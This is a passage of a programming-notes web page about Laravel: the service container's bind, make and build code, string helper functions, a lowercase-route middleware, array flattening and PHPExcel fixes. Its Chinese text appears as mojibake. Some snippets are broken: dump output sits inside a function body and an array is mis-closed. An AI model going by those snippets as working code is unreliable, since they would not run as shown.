class="keyword">class</span> <span class="title">UsersController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $logger;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">LogToDatabase $logger</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;logger = $logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      $user = <span class="string">'JohnDoe'</span>;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;logger-&gt;execute($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ç»‘å®šä¾èµ–ï¼š</span><br><span class="line"></span><br><span class="line">SimpleContainer::bind(<span class="string">'Foo'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> UsersController(<span class="keyword">new</span> LogToDatabase);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line">$foo = SimpleContainer::make(<span class="string">'Foo'</span>);</span><br><span class="line"></span><br><span class="line">print_r($foo-&gt;show());</span><br><span class="line"></span><br><span class="line">Laravel çš„æœåŠ¡å®¹å™¨æºç ï¼švendor/laravel/framwork/src/Illuminate/Container/Container.php</span><br><span class="line"></span><br><span class="line">  public <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">$abstract, $concrete = null, $shared = false</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;normalize($abstract);</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;normalize($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array($abstract)) &#123;</span><br><span class="line">           list($abstract, $alias) = $<span class="keyword">this</span>-&gt;extractAlias($abstract);</span><br><span class="line"></span><br><span class="line">           $<span class="keyword">this</span>-&gt;alias($abstract, $alias);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;dropStaleInstances($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($concrete)) &#123;</span><br><span class="line">            $concrete = $abstract;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            $concrete = $<span class="keyword">this</span>-&gt;getClosure($abstract, $concrete);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;bindings[$abstract] = compact(<span class="string">'concrete'</span>, <span class="string">'shared'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;resolved($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;rebound($abstract);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$abstract, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $abstract = $<span class="keyword">this</span>-&gt;getAlias($<span class="keyword">this</span>-&gt;normalize($abstract));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($<span class="keyword">this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;instances[$abstract];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $concrete = $<span class="keyword">this</span>-&gt;getConcrete($abstract);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;build($concrete, $parameters);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = $<span class="keyword">this</span>-&gt;make($concrete, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;getExtenders($abstract) <span class="keyword">as</span> $extender) &#123;</span><br><span class="line">            $object = $extender($object, $<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;isShared($abstract)) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;instances[$abstract] = $object;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;fireResolvingCallbacks($abstract, $object);</span><br><span class="line"></span><br><span class="line">       $<span class="keyword">this</span>-&gt;resolved[$abstract] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> $object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">build</span>(<span class="params">$concrete, array $parameters = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($concrete <span class="keyword">instanceof</span> Closure) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete($<span class="keyword">this</span>, $parameters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       $reflector = <span class="keyword">new</span> ReflectionClass($concrete);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! $reflector-&gt;isInstantiable()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! empty($<span class="keyword">this</span>-&gt;buildStack)) &#123;</span><br><span class="line">                $previous = implode(<span class="string">', '</span>, $<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable while building [$previous]."</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $message = <span class="string">"Target [$concrete] is not instantiable."</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> BindingResolutionException($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">this</span>-&gt;buildStack[] = $concrete;</span><br><span class="line"></span><br><span class="line">         $<span class="keyword">constructor</span> = $reflector-&gt;getConstructor();</span><br><span class="line"></span><br><span class="line">        if (is_null($<span class="keyword">constructor</span>)) &#123;</span><br><span class="line">            array_pop($<span class="keyword">this</span>-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dependencies = $<span class="keyword">constructor</span>-&gt;getParameters();</span><br><span class="line">        $parameters = $this-&gt;keyParametersByArgument(</span><br><span class="line">            $dependencies, $parameters</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">         $instances = $this-&gt;getDependencies($dependencies,$parameters);</span><br><span class="line"></span><br><span class="line">         array_pop($this-&gt;buildStack);</span><br><span class="line"></span><br><span class="line">         return $reflector-&gt;newInstanceArgs($instances);</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;app-&gt;bind('HelpSpot\API', function ($app) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HelpSpot\API($app-&gt;make(<span class="string">'HttpClient'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">$api = <span class="keyword">new</span> HelpSpot\API(<span class="keyword">new</span> HttpClient);</span><br><span class="line"></span><br><span class="line">$<span class="keyword">this</span>-&gt;app-&gt;instance(<span class="string">'HelpSpot\API'</span>, $api);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26922 https://github.com/nahidulhasan/laravel-service-container</span></span><br><span class="line">Ioc æ˜¯ä¸€ä¸ªç®€å•çš„ç»„ä»¶ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿åœ°è§£æä¾èµ–é¡¹ã€‚ä½ å¯ä»¥å°†å¯¹è±¡å½¢å®¹ä¸ºå®¹å™¨ï¼Œå¹¶ä¸”æ¯æ¬¡è§£æç±»æ—¶ï¼Œéƒ½ä¼šè‡ªåŠ¨æ³¨å…¥ä¾èµ–é¡¹ã€‚</span><br><span class="line">$auth = <span class="keyword">new</span> SimpleAuth( <span class="keyword">new</span> FileSessionStorage() );</span><br><span class="line">å› ä¸º Application ç±»ç»§æ‰¿è‡ª Container ç±»ï¼Œæ‰€ä»¥ä½ å¯ä»¥é€šè¿‡ App é—¨é¢æ¥è®¿é—®å®¹å™¨ã€‚</span><br><span class="line"></span><br><span class="line">App::bind( <span class="string">'FileSessionStorage'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> FileSessionStorage;</span><br><span class="line">&#125;);</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/26721</span></span><br><span class="line"></span><br><span class="line">App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'MysqlSessionStorage'</span> );<span class="comment">//SessionStorageæ˜¯æ¥å£,MysqlSessionStorageå’ŒFileSessionStorageç»§æ‰¿taï¼Œè°ƒç”¨çš„æ—¶å€™æ³¨å…¥SessionStorage $session </span></span><br><span class="line">å¦‚æœæˆ‘ä»¬æƒ³è¦åˆ‡æ¢æˆ‘ä»¬çš„å­˜å‚¨æœåŠ¡ï¼Œæˆ‘ä»¬åªè¦å˜æ›´ä¸€ä¸‹è¿™ä¸ªç»‘å®šã€‚App:bind( <span class="string">'SessionStorage'</span>, <span class="string">'FileSessionStorage '</span> );</span><br><span class="line"></span><br><span class="line">laravelé¢è¯•å“ªäº›é—®é¢˜ v2ex</span><br></pre></td></tr></table></figure>
<h3 id="laravelå‡½æ•°"><a href="#laravelå‡½æ•°" class="headerlink" title="laravelå‡½æ•°"></a>laravelå‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åœ¨ç»™å®šå€¼åè¿”å›å­—ç¬¦ä¸²çš„å…¶ä½™éƒ¨åˆ†ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        dump(explode($search, $subject, <span class="number">2</span>),array_reverse(explode($search, $subject, <span class="number">2</span>)));</span><br><span class="line">        <span class="comment">//array:2 [â–¼</span></span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">""</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">"è¯•laravelå‡½æ•°"</span></span><br><span class="line">          ]</span><br><span class="line">          array:<span class="number">2</span> [â–¼</span><br><span class="line">            <span class="number">0</span> =&gt; <span class="string">"è¯•laravelå‡½æ•°"</span></span><br><span class="line">            <span class="number">1</span> =&gt; <span class="string">""</span></span><br><span class="line">          ]</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : array_reverse(explode($search, $subject, <span class="number">2</span>))[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">$s = <span class="string">'æµ‹è¯•laravelå‡½æ•°'</span>;echo after($s,<span class="string">'æµ‹'</span>);<span class="comment">//è¯•laravelå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ascii</span>(<span class="params">$value, $language = <span class="string">'en'</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $languageSpecific = languageSpecificCharsArray($language);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_null($languageSpecific)) &#123;</span><br><span class="line">            $value = str_replace($languageSpecific[<span class="number">0</span>], $languageSpecific[<span class="number">1</span>], $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach ( charsArray() <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $value = str_replace($val, $key, $value);<span class="comment">//å¾ªç¯å°†æ•°ç»„å†…çš„å­—ç¬¦ä¸²æ›¿æ¢</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">'/[^\x20-\x7E]/u'</span>, <span class="string">''</span>, $value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">languageSpecificCharsArray</span>(<span class="params">$language</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $languageSpecific;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($languageSpecific)) &#123;</span><br><span class="line">            $languageSpecific = [</span><br><span class="line">                <span class="string">'bg'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'Ñ…'</span>, <span class="string">'Ğ¥'</span>, <span class="string">'Ñ‰'</span>, <span class="string">'Ğ©'</span>, <span class="string">'ÑŠ'</span>, <span class="string">'Ğª'</span>, <span class="string">'ÑŒ'</span>, <span class="string">'Ğ¬'</span>],</span><br><span class="line">                    [<span class="string">'h'</span>, <span class="string">'H'</span>, <span class="string">'sht'</span>, <span class="string">'SHT'</span>, <span class="string">'a'</span>, <span class="string">'Ğ'</span>, <span class="string">'y'</span>, <span class="string">'Y'</span>],</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">'de'</span> =&gt; [</span><br><span class="line">                    [<span class="string">'Ã¤'</span>,  <span class="string">'Ã¶'</span>,  <span class="string">'Ã¼'</span>,  <span class="string">'Ã„'</span>,  <span class="string">'Ã–'</span>,  <span class="string">'Ãœ'</span>],</span><br><span class="line">                    [<span class="string">'ae'</span>, <span class="string">'oe'</span>, <span class="string">'ue'</span>, <span class="string">'AE'</span>, <span class="string">'OE'</span>, <span class="string">'UE'</span>],</span><br><span class="line">                ],</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $languageSpecific[$language] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">charsArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $charsArray;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset($charsArray)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $charsArray;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $charsArray = [</span><br><span class="line">            <span class="string">'0'</span>    =&gt; [<span class="string">'Â°'</span>, <span class="string">'â‚€'</span>, <span class="string">'Û°'</span>, <span class="string">'ï¼'</span>],</span><br><span class="line">            <span class="string">'1'</span>    =&gt; [<span class="string">'Â¹'</span>, <span class="string">'â‚'</span>, <span class="string">'Û±'</span>, <span class="string">'ï¼‘'</span>],</span><br><span class="line">            <span class="string">'2'</span>    =&gt; [<span class="string">'Â²'</span>, <span class="string">'â‚‚'</span>, <span class="string">'Û²'</span>, <span class="string">'ï¼’'</span>],</span><br><span class="line">            <span class="string">'3'</span>    =&gt; [<span class="string">'Â³'</span>, <span class="string">'â‚ƒ'</span>, <span class="string">'Û³'</span>, <span class="string">'ï¼“'</span>],</span><br><span class="line">            <span class="string">'4'</span>    =&gt; [<span class="string">'â´'</span>, <span class="string">'â‚„'</span>, <span class="string">'Û´'</span>, <span class="string">'Ù¤'</span>, <span class="string">'ï¼”'</span>],</span><br><span class="line">            <span class="string">'5'</span>    =&gt; [<span class="string">'âµ'</span>, <span class="string">'â‚…'</span>, <span class="string">'Ûµ'</span>, <span class="string">'Ù¥'</span>, <span class="string">'ï¼•'</span>],</span><br><span class="line">            <span class="string">'6'</span>    =&gt; [<span class="string">'â¶'</span>, <span class="string">'â‚†'</span>, <span class="string">'Û¶'</span>, <span class="string">'Ù¦'</span>, <span class="string">'ï¼–'</span>],</span><br><span class="line">            <span class="string">'7'</span>    =&gt; [<span class="string">'â·'</span>, <span class="string">'â‚‡'</span>, <span class="string">'Û·'</span>, <span class="string">'ï¼—'</span>],</span><br><span class="line">            <span class="string">'8'</span>    =&gt; [<span class="string">'â¸'</span>, <span class="string">'â‚ˆ'</span>, <span class="string">'Û¸'</span>, <span class="string">'ï¼˜'</span>],</span><br><span class="line">            <span class="string">'9'</span>    =&gt; [<span class="string">'â¹'</span>, <span class="string">'â‚‰'</span>, <span class="string">'Û¹'</span>, <span class="string">'ï¼™'</span>],</span><br><span class="line">            &#125;</span><br><span class="line"> å°†utf - <span class="number">8</span>å€¼è½¬æ¢ä¸ºASCII           </span><br><span class="line">ascii($s);<span class="comment">//laravel</span></span><br><span class="line"><span class="comment">//åœ¨ç»™å®šå€¼ä¹‹å‰è·å–å­—ç¬¦ä¸²çš„éƒ¨åˆ†ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params">$subject, $search</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $search === <span class="string">''</span> ? $subject : explode($search, $subject)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//å°†ä¸€ä¸ªå€¼è½¬æ¢ä¸ºä¸€ä¸ªå¤§å†™çš„å¤§å†™å­—æ¯</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">studly</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">                 $key = $value;</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">if</span> (isset(<span class="keyword">static</span>::$studlyCache[$key])) &#123;</span><br><span class="line">                         <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key];</span><br><span class="line">                 &#125;</span><br><span class="line"> </span><br><span class="line">                 $value = ucwords(str_replace([<span class="string">'-'</span>, <span class="string">'_'</span>], <span class="string">' '</span>, $value));</span><br><span class="line"> </span><br><span class="line">                 <span class="keyword">return</span> <span class="keyword">static</span>::$studlyCache[$key] = str_replace(<span class="string">' '</span>, <span class="string">''</span>, $value);</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
<h3 id="è·¯ç”±ä¸ºä¸åŒºåˆ†å¤§å°å†™"><a href="#è·¯ç”±ä¸ºä¸åŒºåˆ†å¤§å°å†™" class="headerlink" title="è·¯ç”±ä¸ºä¸åŒºåˆ†å¤§å°å†™"></a>è·¯ç”±ä¸ºä¸åŒºåˆ†å¤§å°å†™</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">æ·»åŠ ä¸­é—´ä»¶. LowerCaseRoutes</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Http\Middleware;</span><br><span class="line"></span><br><span class="line">use Closure;</span><br><span class="line">use \Illuminate\Support\Facades\Redirect;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æŠŠå¤§å†™uriè½¬æ¢ä¸ºå°å†™.å·²ç»å®ç°è·¯ç”±ä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœæœ‰å¤§å†™ï¼Œä¼š 301 è·³è½¬åˆ°å°å†™çš„åœ°å€.</span></span><br><span class="line"><span class="comment">               </span></span><br><span class="line"><span class="comment">https://learnku.com/laravel/t/27783</span></span><br><span class="line"><span class="comment"> * Class LowerCaseRoutes</span></span><br><span class="line"><span class="comment"> * @package App\Http\Middleware</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LowerCaseRoutes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Handle an incoming request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Http\Request  $request</span></span><br><span class="line"><span class="comment">     * @param  \Closure  $next</span></span><br><span class="line"><span class="comment">     * @return mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">$request, Closure $next</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/([A-Z]+)/'</span>, $request-&gt;path(), $match)) &#123;</span><br><span class="line">            $newRoute = str_replace($request-&gt;path(), strtolower($request-&gt;path()), $request-&gt;fullUrl());</span><br><span class="line">            <span class="keyword">return</span> Redirect::to($newRoute, <span class="number">301</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $next($request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ•°ç»„æ‰å¹³åŒ–"><a href="#æ•°ç»„æ‰å¹³åŒ–" class="headerlink" title="æ•°ç»„æ‰å¹³åŒ–"></a>æ•°ç»„æ‰å¹³åŒ–</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$data = [</span><br><span class="line">    <span class="string">'testArray'</span> =&gt; [</span><br><span class="line">        <span class="string">'string1'</span>,</span><br><span class="line">        <span class="string">'string2'</span>,</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'string1'</span>,</span><br><span class="line">            <span class="string">'string2'</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'teststring'</span></span><br><span class="line">];</span><br><span class="line">echo <span class="string">"&lt;pre&gt;"</span>;https:<span class="comment">//learnku.com/articles/24318</span></span><br><span class="line"></span><br><span class="line">print_r(iterator_to_array(</span><br><span class="line">        <span class="keyword">new</span> RecursiveIteratorIterator(</span><br><span class="line">            <span class="keyword">new</span> RecursiveArrayIterator($data)</span><br><span class="line">        ),</span><br><span class="line">        <span class="literal">false</span>  <span class="comment">// use_keys:é»˜è®¤true</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; string1</span></span><br><span class="line"><span class="comment">    [1] =&gt; string2</span></span><br><span class="line"><span class="comment">    [2] =&gt; string1</span></span><br><span class="line"><span class="comment">    [3] =&gt; string2</span></span><br><span class="line"><span class="comment">    [4] =&gt; teststring</span></span><br><span class="line"><span class="comment">)*/</span></span><br><span class="line">collect ($data)-&gt;flatten ()-&gt;all ()</span><br></pre></td></tr></table></figure>
<h3 id="phpexcelç§‘å­¦è®¡æ•°æ³•"><a href="#phpexcelç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="phpexcelç§‘å­¦è®¡æ•°æ³•"></a>phpexcelç§‘å­¦è®¡æ•°æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ‹¼ä¸€ä¸ª \t</span><br><span class="line">è®¾ç½®å•å…ƒæ ¼æ ¼å¼ä¸ºæ–‡æœ¬æ ¼å¼https:<span class="comment">//learnku.com/articles/23696</span></span><br><span class="line"></span><br><span class="line">          $card_no_style = [</span><br><span class="line">                        <span class="string">'numberFormat'</span> =&gt; [</span><br><span class="line">                            <span class="string">'formatCode'</span> =&gt; NumberFormat::FORMAT_TEXT</span><br><span class="line">                        ]</span><br><span class="line"></span><br><span class="line">                    ];</span><br><span class="line">                    $obj_sheet-&gt;getStyle(Coordinate::stringFromColumnIndex($column) . <span class="string">"1"</span> . <span class="string">":"</span> . Coordinate::stringFromColumnIndex($column) . count($data))-&gt;applyFromArray($card_no_style);</span><br></pre></td></tr></table></figure>
<h3 id="PHPExcel-åœ¨-PHP7-0-ä»¥ä¸Šç‰ˆæœ¬æŠ¥é”™"><a href="#PHPExcel-åœ¨-PHP7-0-ä»¥ä¸Šç‰ˆæœ¬æŠ¥é”™" class="headerlink" title="PHPExcel åœ¨ PHP7.0 ä»¥ä¸Šç‰ˆæœ¬æŠ¥é”™"></a>PHPExcel åœ¨ PHP7.0 ä»¥ä¸Šç‰ˆæœ¬æŠ¥é”™</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'break'</span> not <span class="keyword">in</span> the <span class="string">'loop'</span> or <span class="string">'switch'</span> context</span><br><span class="line"></span><br><span class="line">PHPExcel\Calculation\Functions.php ã€€LINE: <span class="number">581</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($value === NULL) || (is_float($value)) || (is_int($value))) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; elseif(is_bool($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        &#125; elseif(is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">64</span>;</span><br><span class="line">                <span 